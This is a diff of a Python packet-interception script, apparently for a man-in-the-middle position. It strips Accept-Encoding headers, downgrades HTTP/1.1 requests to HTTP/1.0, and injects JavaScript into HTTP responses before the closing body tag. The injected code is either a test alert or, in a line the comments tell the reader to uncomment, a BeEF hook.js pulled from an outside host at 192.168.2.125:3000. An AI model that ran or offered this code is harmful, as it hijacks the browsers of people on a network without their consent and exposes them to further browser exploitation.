@@ -33,13 +33,15 @@ def process_pkt(pkt):
         if scapy_pkt[scapy.TCP].dport == 80: # HTTP Request
             print('[+] HTTP Request detected!')
             load = re.sub(b'Accept-Encoding: .*?\\r\\n',b'',load)
+            if b'HTTP/1.1' in load:
+                load = re.sub(b'HTTP/1.1',b'HTTP/1.0',load)
             pkt.set_payload(arrange_new_pkt(scapy_pkt,load))
         elif scapy_pkt[scapy.TCP].sport == 80: # HTTP Response
             print('[+] HTTP Response detected!')
             script = b'<script>alert("HACKED!");</script>'
             # Below is for a script to be used in beef framework, change the ip address to use it on your own
             script_for_beef = b"<script src='http://192.168.2.125:3000/hook.js'></script>"
-            #script = script_for_beef # uncomment it if you want to try for beEF framework.
+            #script = script_for_beef # 
             if b'</body>' in load:
                 injection_code = b'</body>' + script
                 load = re.sub(b'</body>',injection_code,load)
